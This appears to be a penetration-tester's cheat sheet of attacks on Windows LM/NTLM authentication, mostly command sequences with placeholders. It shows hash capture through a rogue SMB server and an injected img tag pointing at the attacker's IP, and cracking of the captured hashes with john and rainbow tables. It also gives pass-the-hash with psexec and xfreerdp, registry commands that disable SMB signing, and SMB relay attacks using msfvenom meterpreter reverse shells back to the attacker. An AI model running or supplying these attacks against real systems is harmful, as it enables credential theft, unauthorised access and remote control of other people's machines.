# ------------------------------- start LM/NTLMv1 protocol - cracking hash attack ------------------------------- # 
    # ---------- |Tools| ---------- #
        - metasploit: auxiliary/server/capture/smb: http://www.metasploit.com/modules/auxiliary/server/capture/smb
        - john
        - rcracki_mt: https://github.com/foreni-packages/rcracki_mt
        - halflm_second.rb
        - netntlm.pl
    # ---------- |metasploit: auxiliary/server/capture/smb| ---------- #
        ==> Quick View: create a listening SMB service that will both accept incoming connections,
        and send back a fixed challenge.
        1st: use auxiliary/server/capture/smb
                set challenge <fixed_value>
                set johnpwfile <output_file_to_save_hashes>
            ==> explanation: run SMB service.
        2nd: force user to call your server, for example: inject <img src="\\<attacker_ip>\<share_path>">
        within web code.

        ==> I.V Note: if the password is less than or equal to 7 character the last 8 bytes of LM hash will be the 
        same: 2f85252cc731bb25

        3rd: time john --format=netlm <hash_captured_file>

        3rd: rcracki_mt -h <first_8bytes_hash> -t <thread> <rainbow_list>
            ==> explanation: crack first 8 bytes of the NTLMv1.
        4th: halflm_second.rb -n <hash> -p <cracked_value>
            ==> explanation: to obtain full of clear text.
        5th: netntlm.pl --file <file_hash> -seed <cracked_value>
            ==> explanation: obtain password case-sensitive password.
# -------------------------------   end LM/NTLMv1 protocol - cracking hash attack ------------------------------- # 

# ------------------------------- start LM/NTLMv1 protocol - pass the hash ------------------------------- # 
    # ---------- |Tools| ---------- #
        - metasploit: exploit/windows/smb/psexec
        - xfreerdp

    # ---------- |metasploit: exploit/windows/smb/psexec| ---------- #
        msf> exploit/windows/smb/psexec
        show options
        set rhost <target_ip>
        set smbuser <user>
        set smbpass <user_pass_or_hash>
        run
    
    # ---------- |xfreerdp| ---------- #
        xfreerdp /u:<username> /d:<domain> /pth:<hash> /v:<target_ip>

    ==> V.I Note: being local administrators group is not enough to pass the hash and depending on the windows
        operating system configuration and versions.
        the issue presents itself when trying to pass the hash from and account which isn't an actual administrator
        (RID-500).
        - if return error STATUS_ACCESS_DENIED (Command=117 Wordcount=0) error. this is a good indication that 
        registry changes may be required on the target host in order for a sucessful pass the hash attack to allow non RID-500
        user accounts (users in the local adminsitrator group for instance) to successfully pass the hash in some cases.
        - two registry entries neede on the target for this to be successful are:
            - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
                - add new DWORD (32-bit) named "LocalAccountTokenFilterPolicy" and set value to "1"
            - HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Paramters
                - add new DWORD (32-bit) named RequireSecuritySignature and set vaule to "0"
        - change registry entries through powershell
            - Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
            - Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Paramters -Name RequireSecuritySignature -Value 0 -Type DWord
        - alternative way, change registry entries through CMD
            - reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
            - reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Paramters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
# -------------------------------   end LM/NTLMv1 protocol - pass the hash ------------------------------- # 

# ------------------------------- start LM/NTLMv1 protocol - relay attack ------------------------------- # 
    ==> Qick View: SMB relay attack allow the attacker to re-use authentication attempts in order to gain access
    to a system in the network.
    attack scenario:
        1- during SMB relay attack, teh attacker act like man in the middle, the attacker selects the target and waits
        until someone isn in the network tries to authenticate to his machine.
        2- when a soemone tries to authenticate on the attacker, attacker sends the authentication attempt to the target
        3- the target create the challenge and sends it back to the attacker.
        4- the attacker sends the challenge to the machine that initated the someone.
        5- someone encrypts with the password hash and send it back to the attacker.
        6- the attacker sends the encrypted challenge to the target and authenticate itself.

    # ---------- |Tools| ---------- #
        - metasploit: smb_relay.

    # ---------- |metasploit: smb_relay| ---------- #
        use use exploit/windows/smb/smb_relay
        set SMBHOST <target_ip>
        set payload windows/meterpreter/reverse_tcp
        set lhost <attacker_ip>
        set lport <attacker_port>
# -------------------------------   end LM/NTLMv1 protocol - relay attack ------------------------------- # 

# ------------------------------- start LM/NTLMv2 protocol - relayx attack ------------------------------- # 
    # ---------- |Tools| ---------- #
        - smbrelayx.py: impacket modules.
        - msfvenom
        - metasploit: exploit/multi/handler

    # ---------- |msfvenom| ---------- #
        1st: create payload
        msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=<attacker_port> -f exe -o smbexp.exe

    # ---------- |metasploit: exploit/multi/handler| ---------- #
        2nd: make handler ready.
        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost <target_ip>
        set lport <attacker_port>
        exploit -j
    
    # ---------- |smbrelayx.py| ---------- #
        3rd: run smbrelayx
        smbrelayx.py -h <target_ip> -e <payload_path>
# -------------------------------   end LM/NTLMv2 protocol - relayx attack ------------------------------- # 
